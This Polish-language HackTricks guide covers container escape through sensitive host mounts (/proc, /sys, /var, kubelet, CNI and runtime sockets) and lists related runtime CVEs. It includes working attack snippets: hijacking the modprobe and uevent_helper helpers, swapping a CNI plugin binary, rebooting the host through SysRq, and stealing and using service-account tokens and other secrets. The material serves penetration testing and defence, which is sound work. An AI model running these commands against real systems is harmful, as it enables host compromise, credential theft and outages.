# Wrażliwe mounty hosta

{{#include ../../../banners/hacktricks-training.md}}

## Omówienie

Host mounts należą do najważniejszych praktycznych powierzchni container escape, ponieważ często cofają starannie odizolowany widok procesu do bezpośredniej widoczności zasobów hosta. Niebezpieczne przypadki nie ograniczają się do `/`. Bind mounts dla `/proc`, `/sys`, `/var`, runtime sockets, stanu zarządzanego przez kubelet lub ścieżek związanych z urządzeniami mogą ujawniać mechanizmy kontroli kernela, credentials, systemy plików sąsiednich kontenerów i interfejsy zarządzania runtime.

Ta strona istnieje osobno od poszczególnych stron dotyczących ochrony, ponieważ model abuse obejmuje wiele obszarów. Writable host mount jest niebezpieczny częściowo z powodu mount namespaces, częściowo z powodu user namespaces, częściowo z powodu zakresu ochrony AppArmor lub SELinux, a częściowo z powodu dokładnej ścieżki hosta, która została udostępniona. Traktowanie tego jako osobnego tematu znacznie ułatwia analizę attack surface.

## Ekspozycja `/proc`

procfs zawiera zarówno standardowe informacje o procesach, jak i interfejsy kontroli kernela o dużym wpływie. Bind mount, taki jak `-v /proc:/host/proc`, lub widok kontenera, który udostępnia nieoczekiwane writable wpisy proc, może zatem prowadzić do ujawnienia informacji, denial of service lub bezpośredniego host code execution.

Najcenniejsze ścieżki procfs obejmują:

- `/proc/sys/kernel/core_pattern`
- `/proc/sys/kernel/modprobe`
- `/proc/sys/vm/panic_on_oom`
- `/proc/sys/fs/binfmt_misc`
- `/proc/config.gz`
- `/proc/sysrq-trigger`
- `/proc/kmsg`
- `/proc/kallsyms`
- `/proc/[pid]/mem`
- `/proc/kcore`
- `/proc/kmem`
- `/proc/mem`
- `/proc/sched_debug`
- `/proc/[pid]/mountinfo`

### Abuse

Zacznij od sprawdzenia, które cenne wpisy procfs są widoczne lub writable:
```bash
for p in \
/proc/sys/kernel/core_pattern \
/proc/sys/kernel/modprobe \
/proc/sysrq-trigger \
/proc/kmsg \
/proc/kallsyms \
/proc/kcore \
/proc/sched_debug \
/proc/1/mountinfo \
/proc/config.gz; do
[ -e "$p" ] && ls -l "$p"
done
```
Te ścieżki są interesujące z różnych powodów. `core_pattern`, `modprobe` i `binfmt_misc` mogą stać się ścieżkami do wykonywania kodu na hoście, jeśli są zapisywalne. `kallsyms`, `kmsg`, `kcore` i `config.gz` są cennymi źródłami informacji rozpoznawczych przy kernel exploitation. `sched_debug` i `mountinfo` ujawniają informacje o procesach, cgroupach i systemie plików, które mogą pomóc odtworzyć układ hosta z wnętrza kontenera.

Praktyczna wartość każdej ścieżki jest inna, a traktowanie ich tak, jakby wszystkie miały ten sam wpływ, utrudnia triage:

- `/proc/sys/kernel/core_pattern`
Jeśli ta ścieżka jest zapisywalna, jest jedną z procfs ścieżek o największym wpływie, ponieważ kernel wykona pipe handler po awarii. Kontener, który może wskazać w `core_pattern` payload przechowywany w swojej warstwie overlay lub w zamontowanej ścieżce hosta, może często uzyskać wykonywanie kodu na hoście. Zobacz także [read-only-paths.md](protections/read-only-paths.md), gdzie znajduje się dedykowany przykład.
- `/proc/sys/kernel/modprobe`
Ta ścieżka kontroluje userspace helper używany przez kernel, gdy musi wywołać logikę ładowania modułów. Jeśli jest zapisywalna z poziomu kontenera i interpretowana w kontekście hosta, może stać się kolejnym prymitywem wykonywania kodu na hoście. Jest szczególnie interesująca w połączeniu z możliwością wywołania ścieżki helpera.
- `/proc/sys/vm/panic_on_oom`
Zwykle nie jest to czysty prymityw escape, ale może przekształcić presję pamięci w denial of service obejmujący całego hosta, zamieniając warunki OOM w zachowanie prowadzące do kernel panic.
- `/proc/sys/fs/binfmt_misc`
Jeśli interfejs rejestracji jest zapisywalny, attacker może zarejestrować handler dla wybranej wartości magic i uzyskać wykonywanie w kontekście hosta po uruchomieniu pasującego pliku.
- `/proc/config.gz`
Przydatny w triage kernel exploitów. Pomaga ustalić, które subsystemy, mitigations i opcjonalne funkcje kernela są włączone, bez konieczności korzystania z metadanych pakietów hosta.
- `/proc/sysrq-trigger`
Przede wszystkim ścieżka denial of service, ale bardzo poważna. Może natychmiast zrestartować hosta, wywołać panic lub w inny sposób zakłócić jego działanie.
- `/proc/kmsg`
Ujawnia komunikaty z kernelowego ring buffer. Jest przydatny do fingerprintingu hosta, analizy awarii, a w niektórych środowiskach także do leakowania informacji pomocnych przy kernel exploitation.
- `/proc/kallsyms`
Cenny, gdy jest czytelny, ponieważ ujawnia informacje o eksportowanych symbolach kernela i może pomóc obejść założenia dotyczące randomizacji adresów podczas tworzenia kernel exploitów.
- `/proc/[pid]/mem`
Jest to bezpośredni interfejs do pamięci procesu. Jeśli proces docelowy jest osiągalny przy spełnieniu wymaganych warunków w stylu ptrace, może umożliwiać odczyt lub modyfikację pamięci innego procesu. Rzeczywisty wpływ w dużej mierze zależy od credentials, `hidepid`, Yama i ograniczeń ptrace, więc jest to potężna, ale warunkowa ścieżka.
- `/proc/kcore`
Udostępnia widok pamięci systemowej w stylu obrazu core. Plik jest ogromny i trudny w użyciu, ale jeśli jest faktycznie czytelny, wskazuje na poważnie ujawnioną powierzchnię pamięci hosta.
- `/proc/kmem` i `/proc/mem`
Historycznie interfejsy surowej pamięci o dużym wpływie. W wielu nowoczesnych systemach są wyłączone lub silnie ograniczone, ale jeśli są obecne i możliwe do użycia, należy traktować je jako findings o poziomie critical.
- `/proc/sched_debug`
Leakuje informacje o planowaniu i zadaniach, które mogą ujawniać tożsamości procesów hosta, nawet gdy inne widoki procesów wyglądają na bardziej ograniczone, niż oczekiwano.
- `/proc/[pid]/mountinfo`
Niezwykle przydatna ścieżka do odtworzenia, gdzie kontener faktycznie znajduje się na hoście, które ścieżki są oparte na overlay oraz czy zapisywalny mount odpowiada zawartości hosta, czy tylko warstwie kontenera.

Jeśli `/proc/[pid]/mountinfo` lub szczegóły overlay są czytelne, użyj ich do odzyskania ścieżki hosta do systemu plików kontenera:
```bash
cat /proc/self/mountinfo | head -n 50
mount | grep overlay
```
Te polecenia są przydatne, ponieważ wiele technik wykonywania kodu na hoście wymaga przekształcenia ścieżki wewnątrz kontenera na odpowiadającą jej ścieżkę z perspektywy hosta.

### Pełny przykład: nadużycie ścieżki pomocnika `modprobe`

Jeśli `/proc/sys/kernel/modprobe` można zapisywać z poziomu kontenera, a ścieżka pomocnika jest interpretowana w kontekście hosta, można przekierować ją do payloadu kontrolowanego przez atakującego:
```bash
[ -w /proc/sys/kernel/modprobe ] || exit 1
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /tmp/modprobe-payload
#!/bin/sh
id > /tmp/modprobe.out
EOF
chmod +x /tmp/modprobe-payload
echo "$host_path/tmp/modprobe-payload" > /proc/sys/kernel/modprobe
cat /proc/sys/kernel/modprobe
```
Dokładny mechanizm wyzwalający zależy od celu i zachowania kernela, ale najważniejsze jest to, że zapisywalna ścieżka helpera może przekierować przyszłe wywołanie kernela do zawartości ścieżki hosta kontrolowanej przez atakującego.

### Pełny przykład: rozpoznanie kernela za pomocą `kallsyms`, `kmsg` i `config.gz`

Jeśli celem jest ocena możliwości exploitacji, a nie natychmiastowe wykonanie escape:
```bash
head -n 20 /proc/kallsyms 2>/dev/null
dmesg 2>/dev/null | head -n 50
zcat /proc/config.gz 2>/dev/null | egrep 'IKCONFIG|BPF|USER_NS|SECCOMP|KPROBES' | head -n 50
```
Te polecenia pomagają ustalić, czy widoczne są przydatne informacje o symbolach, czy najnowsze komunikaty kernela ujawniają interesujący stan oraz które funkcje kernela lub mitigations zostały skompilowane. Wpływ zazwyczaj nie polega na bezpośrednim escape, ale może znacznie skrócić triage podatności kernela.

### Pełny przykład: ponowne uruchomienie hosta przez SysRq

Jeśli `/proc/sysrq-trigger` jest zapisywalny i odwołuje się do widoku hosta:
```bash
echo b > /proc/sysrq-trigger
```
Efektem jest natychmiastowy reboot hosta. Nie jest to subtelny przykład, ale wyraźnie pokazuje, że ekspozycja procfs może być znacznie poważniejsza niż ujawnienie informacji.

## Ekspozycja `/sys`

sysfs udostępnia duże ilości informacji o stanie kernela i urządzeń. Niektóre ścieżki sysfs są głównie przydatne do fingerprintingu, podczas gdy inne mogą wpływać na wykonywanie helperów, zachowanie urządzeń, konfigurację modułów bezpieczeństwa lub stan firmware.

Ścieżki sysfs o wysokiej wartości obejmują:

- `/sys/kernel/uevent_helper`
- `/sys/class/thermal`
- `/sys/kernel/vmcoreinfo`
- `/sys/kernel/security`
- `/sys/firmware/efi/vars`
- `/sys/firmware/efi/efivars`
- `/sys/kernel/debug`

Ścieżki te są istotne z różnych powodów. `/sys/class/thermal` może wpływać na działanie zarządzania temperaturą, a tym samym na stabilność hosta w środowiskach z nieprawidłową ekspozycją. `/sys/kernel/vmcoreinfo` może leakować informacje o zrzutach awarii i układzie kernela, które pomagają w niskopoziomowym fingerprintingu hosta. `/sys/kernel/security` to interfejs `securityfs` używany przez Linux Security Modules, dlatego nieoczekiwany dostęp do niego może ujawniać lub modyfikować stan związany z MAC. Ścieżki zmiennych EFI mogą wpływać na ustawienia uruchamiania zapisane w firmware, przez co są znacznie poważniejsze niż zwykłe pliki konfiguracyjne. `debugfs` w `/sys/kernel/debug` jest szczególnie niebezpieczny, ponieważ jest celowo interfejsem przeznaczonym dla developerów i podlega znacznie mniejszym wymaganiom bezpieczeństwa niż utwardzone API kernela przeznaczone dla środowisk produkcyjnych.

Przydatne polecenia do przeglądu tych ścieżek to:
```bash
find /sys/kernel/security -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/kernel/debug -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/firmware/efi -maxdepth 3 -type f 2>/dev/null | head -n 50
find /sys/class/thermal -maxdepth 3 -type f 2>/dev/null | head -n 50
cat /sys/kernel/vmcoreinfo 2>/dev/null | head -n 20
```
Co sprawia, że te commands są interesujące:

- `/sys/kernel/security` może ujawnić, czy AppArmor, SELinux lub inna powierzchnia LSM jest widoczna w sposób, który powinien pozostać dostępny wyłącznie z hosta.
- `/sys/kernel/debug` jest często najbardziej alarmującym znaleziskiem w tej grupie. Jeśli `debugfs` jest zamontowany i dostępny do odczytu lub zapisu, należy spodziewać się szerokiej powierzchni skierowanej do kernela, której dokładne ryzyko zależy od włączonych węzłów debugowania.
- Ekspozycja zmiennych EFI jest mniej powszechna, ale ma duży wpływ, ponieważ dotyczy ustawień przechowywanych przez firmware, a nie zwykłych plików runtime.
- `/sys/class/thermal` ma znaczenie głównie dla stabilności hosta i interakcji ze sprzętem, a nie dla klasycznego escape z użyciem shella.
- `/sys/kernel/vmcoreinfo` jest przede wszystkim źródłem informacji do fingerprintingu hosta i analizy crashy, przydatnym do zrozumienia niskopoziomowego stanu kernela.

### Pełny przykład: `uevent_helper`

Jeśli `/sys/kernel/uevent_helper` jest dostępny do zapisu, kernel może wykonać kontrolowany przez attackera helper, gdy zostanie wywołany `uevent`:
```bash
cat <<'EOF' > /evil-helper
#!/bin/sh
id > /output
EOF
chmod +x /evil-helper
host_path=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
echo "$host_path/evil-helper" > /sys/kernel/uevent_helper
echo change > /sys/class/mem/null/uevent
cat /output
```
Powodem, dla którego to działa, jest to, że ścieżka helpera jest interpretowana z perspektywy hosta. Po wywołaniu helper działa w kontekście hosta, a nie wewnątrz bieżącego kontenera.

## Ekspozycja `/var`

Montowanie `/var` hosta w kontenerze jest często niedoceniane, ponieważ nie wygląda tak dramatycznie jak montowanie `/`. W praktyce może wystarczyć do uzyskania dostępu do socketów runtime, katalogów snapshotów kontenerów, wolumenów podów zarządzanych przez kubelet, projektowanych tokenów service-account oraz systemów plików sąsiednich aplikacji. We współczesnych węzłach `/var` często zawiera najważniejszy z operacyjnego punktu widzenia stan kontenerów.

### Przykład Kubernetes

Pod z `hostPath: /var` może często odczytywać projektowane tokeny innych podów oraz zawartość snapshotów overlay:
```bash
find /host-var/ -type f -iname '*.env*' 2>/dev/null
find /host-var/ -type f -iname '*token*' 2>/dev/null | grep kubernetes.io
cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null
```
Te polecenia są przydatne, ponieważ pokazują, czy mount udostępnia wyłącznie nieistotne dane aplikacji, czy dane uwierzytelniające klastra o wysokim wpływie. Dostępny do odczytu service-account token może natychmiast przekształcić local code execution w dostęp do Kubernetes API.

Jeśli token jest dostępny, sprawdź, do czego zapewnia dostęp, zamiast kończyć na samym token discovery:
```bash
TOKEN=$(cat /host-var/lib/kubelet/pods/<pod-id>/volumes/kubernetes.io~projected/<volume>/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://kubernetes.default.svc/api
```
Wpływ może być tutaj znacznie większy niż lokalny dostęp do node'a. Token z szerokimi uprawnieniami RBAC może zmienić zamontowane `/var` w kompromitację całego klastra.

### Przykład Docker i containerd

Na hostach Docker odpowiednie dane często znajdują się w `/var/lib/docker`, natomiast na node'ach Kubernetes korzystających z containerd mogą znajdować się w `/var/lib/containerd` lub w ścieżkach specyficznych dla snapshottera:
```bash
docker info 2>/dev/null | grep -i 'docker root\\|storage driver'
find /host-var/lib -maxdepth 5 -type f -iname '*.env*' 2>/dev/null | head -n 50
find /host-var/lib -maxdepth 8 -type f -iname 'index.html' 2>/dev/null | head -n 50
```
Jeśli zamontowany `/var` ujawnia zapisywalną zawartość snapshotu innego workloadu, attacker może być w stanie modyfikować pliki aplikacji, umieszczać treści webowe lub zmieniać skrypty startowe bez dotykania konfiguracji bieżącego kontenera.

Konkretne pomysły na abuse po znalezieniu zapisywalnej zawartości snapshotu:
```bash
echo '<html><body>pwned</body></html>' > /host-var/lib/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/<id>/fs/usr/share/nginx/html/index2.html 2>/dev/null
grep -Rni 'JWT_SECRET\\|TOKEN\\|PASSWORD' /host-var/lib 2>/dev/null | head -n 50
find /host-var/lib -type f -path '*/.ssh/*' -o -path '*/authorized_keys' 2>/dev/null | head -n 20
```
Te polecenia są przydatne, ponieważ pokazują trzy główne rodziny skutków zamontowanego `/var`: manipulowanie aplikacjami, odzyskiwanie sekretów oraz lateral movement do sąsiednich workloadów.

## Stan Kubelet, Plugins i ścieżki CNI

Montowanie `/var/lib/kubelet`, `/opt/cni/bin` lub `/etc/cni/net.d` jest często dostępne przez uprzywilejowane DaemonSets, agentów CNI, node plugins CSI, operatorów GPU oraz helpers storage. Te mounty łatwo zlekceważyć jako „infrastrukturę węzła”, ale znajdują się bezpośrednio na ścieżce wykonywania dla nowych podów i często zawierają credentials Kubeleta, projected secrets, sockets rejestracyjne oraz wykonywalne binaria plugins po stronie hosta.

Cele o wysokiej wartości obejmują:

- `/var/lib/kubelet/pki`
- `/var/lib/kubelet/pods`
- `/var/lib/kubelet/device-plugins/kubelet.sock`
- `/var/lib/kubelet/pod-resources/kubelet.sock`
- `/var/lib/kubelet/plugins`
- `/var/lib/kubelet/plugins_registry`
- `/opt/cni/bin`
- `/etc/cni/net.d`

Przydatne polecenia do przeglądu to:
```bash
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | \
egrep 'pki|pods/.*/token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 2>/dev/null
grep -RniE 'type|ipam|delegate' /host/etc/cni/net.d 2>/dev/null | head -n 50
```
Dlaczego te ścieżki mają znaczenie:

- `/var/lib/kubelet/pki` może ujawniać certyfikaty klienckie kubeleta oraz inne lokalne dla węzła poświadczenia, które czasami można ponownie wykorzystać przeciwko API serverowi lub endpointom TLS kubeleta, zależnie od projektu klastra.
- `/var/lib/kubelet/pods` często zawiera projected service-account tokens oraz zamontowane Secrets sąsiednich podów działających na tym samym węźle.
- `/var/lib/kubelet/pod-resources/kubelet.sock` jest głównie powierzchnią rozpoznania, ale bardzo użyteczną: ujawnia, które pody i kontenery aktualnie korzystają z GPU, hugepages, urządzeń SR-IOV oraz innych deficytowych zasobów lokalnych dla węzła.
- `/var/lib/kubelet/device-plugins`, `/var/lib/kubelet/plugins` oraz `/var/lib/kubelet/plugins_registry` ujawniają, które CSI, DRA i device plugins są zainstalowane oraz z którymi socketami kubelet ma się komunikować. Jeśli te katalogi są zapisywalne, a nie tylko dostępne do odczytu, finding staje się znacznie poważniejszy.
- `/opt/cni/bin` oraz `/etc/cni/net.d` znajdują się bezpośrednio na ścieżce konfiguracji sieci podów. Dostęp z możliwością zapisu jest często opóźnionym prymitywem umożliwiającym wykonanie na hoście, a nie tylko ujawnieniem konfiguracji.

### Pełny przykład: zapisywalny `/opt/cni/bin`

Jeśli katalog hosta z binariami CNI jest zamontowany z uprawnieniami read-write, zastąpienie pluginu może wystarczyć do uzyskania wykonania na hoście przy następnym tworzeniu pod sandbox przez kubelet na tym węźle:
```bash
plugin=$(find /host/opt/cni/bin -maxdepth 1 -type f -perm /111 | \
grep -E '/(bridge|loopback|portmap|calico|flannel|cilium-cni)$' | head -n1)
[ -n "$plugin" ] || exit 1
mv "$plugin" "${plugin}.orig"
cat <<'EOF' > "$plugin"
#!/bin/sh
id > /tmp/cni-triggered
exec "$(dirname "$0")/$(basename "$0").orig" "$@"
EOF
chmod +x "$plugin"
echo "wait for the next pod scheduled on this node"
```
Nie jest to tak natychmiastowe jak zamontowany `docker.sock`, ale często jest bardziej realistyczne w przypadku przejętych podów infrastruktury Kubernetes. Najważniejsze jest to, że zmodyfikowany binary zostanie później wykonany przez proces konfiguracji sieci hosta, a nie przez bieżący kontener.


## Runtime Sockets

Wrażliwe mounty hosta często obejmują runtime sockets zamiast pełnych katalogów. Są one tak ważne, że zasługują tutaj na wyraźne powtórzenie:
```text
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/run/buildkit/buildkitd.sock
/var/run/kubelet.sock
/run/firecracker-containerd.sock
```
Zobacz [runtime-api-and-daemon-exposure.md](runtime-api-and-daemon-exposure.md), aby zapoznać się z pełnymi ścieżkami exploitacji po zamontowaniu jednego z tych socketów.

Jako szybki schemat pierwszej interakcji:
```bash
docker -H unix:///host/run/docker.sock version 2>/dev/null
ctr --address /host/run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///host/var/run/crio/crio.sock ps 2>/dev/null
```
Jeśli jedna z tych metod zakończy się powodzeniem, droga od „mounted socket” do „start a more privileged sibling container” jest zwykle znacznie krótsza niż dowolna ścieżka kernel breakout.

## Writable Host Path Task Hijack

Writable host mount nie musi udostępniać `/`, aby stanowić zagrożenie. Jeśli zamontowana ścieżka zawiera skrypty, pliki konfiguracyjne, hooki, pluginy lub pliki później wykorzystywane przez zaplanowane zadanie albo usługę działającą po stronie hosta, kontener może być w stanie zmienić to, co host wykonuje.

Ogólny przebieg przeglądu:
```bash
mount | grep -E ' /host|/mnt|/shared|/opt|/var '
find /host /mnt /shared -maxdepth 4 -type f -writable 2>/dev/null | head -n 50
grep -RniE 'cron|systemd|ExecStart|sh |bash |python|backup|hook|plugin' /host /mnt /shared 2>/dev/null | head -n 50
```
Jeśli proces hosta korzysta z zapisywalnego pliku, podczas testowania payload powinien być prosty i możliwy do zaobserwowania:
```bash
printf '#!/bin/sh\nid >/tmp/host-task-check\n' > /host/path/to/hook.sh
chmod +x /host/path/to/hook.sh
```
Interesującą częścią jest granica zaufania: zapis następuje z wnętrza kontenera, ale wykonanie następuje później w kontekście usługi hosta. Zmienia to wąski hostPath lub bind mount w opóźniony mechanizm wykonywania kodu na hoście.

## CVE związane z mountami

Mounty hosta są również powiązane z podatnościami runtime. Do ważnych, niedawnych przykładów należą:

- `CVE-2024-21626` w `runc`, gdzie ujawniony deskryptor pliku katalogu mógł umieścić katalog roboczy w systemie plików hosta.
- `CVE-2024-23651`, `CVE-2024-23652` i `CVE-2024-23653` w BuildKit, gdzie złośliwe Dockerfile, frontendy i przepływy `RUN --mount` mogły ponownie umożliwić dostęp do plików hosta, ich usuwanie lub uzyskanie podwyższonych uprawnień podczas buildów.
- `CVE-2024-1753` w przepływach buildów Buildah i Podman, gdzie spreparowane bind mounty podczas builda mogły udostępnić `/` w trybie odczytu i zapisu.
- `CVE-2025-47290` w `containerd` 2.1.0, gdzie podatność TOCTOU podczas rozpakowywania obrazu mogła umożliwić specjalnie spreparowanemu obrazowi modyfikowanie systemu plików hosta podczas pull.

Te CVE mają tutaj znaczenie, ponieważ pokazują, że obsługa mountów nie dotyczy wyłącznie konfiguracji operatora. Sam runtime może również wprowadzać warunki umożliwiające escape z użyciem mountów.

## Sprawdzenia

Użyj tych poleceń, aby szybko zlokalizować najbardziej istotne ekspozycje mountów:
```bash
mount
find / -maxdepth 3 \( -path '/host*' -o -path '/mnt*' -o -path '/rootfs*' \) -type d 2>/dev/null | head -n 100
find / -maxdepth 4 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
find /host-var/lib/kubelet -maxdepth 3 \( -type f -o -type s \) 2>/dev/null | egrep 'pki|token|device-plugins|pod-resources|plugins(_registry)?' | head -n 100
ls -ld /host/opt/cni/bin /host/etc/cni/net.d 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Co jest tutaj interesujące:

- Host root, `/proc`, `/sys`, `/var` oraz runtime sockets to najważniejsze ustalenia.
- Zapisywalne wpisy proc/sys często oznaczają, że mount udostępnia globalne dla hosta mechanizmy kontroli kernela, a nie bezpieczny widok kontenera.
- Zamontowane ścieżki `/var` wymagają analizy poświadczeń i sąsiednich workloadów, a nie tylko przeglądu systemu plików.
- Kubelet state directories oraz ścieżki CNI/plugin wymagają takiego samego priorytetu jak runtime sockets, ponieważ często znajdują się bezpośrednio na ścieżce tworzenia podów i dystrybucji poświadczeń na node.

## References

- [Local Files And Paths Used By The Kubelet](https://kubernetes.io/docs/reference/node/kubelet-files/)
- [cilium-agent container can access the host via `hostPath` mount](https://github.com/cilium/cilium/security/advisories/GHSA-4hc4-pgfx-3mrx)
{{#include ../../../banners/hacktricks-training.md}}
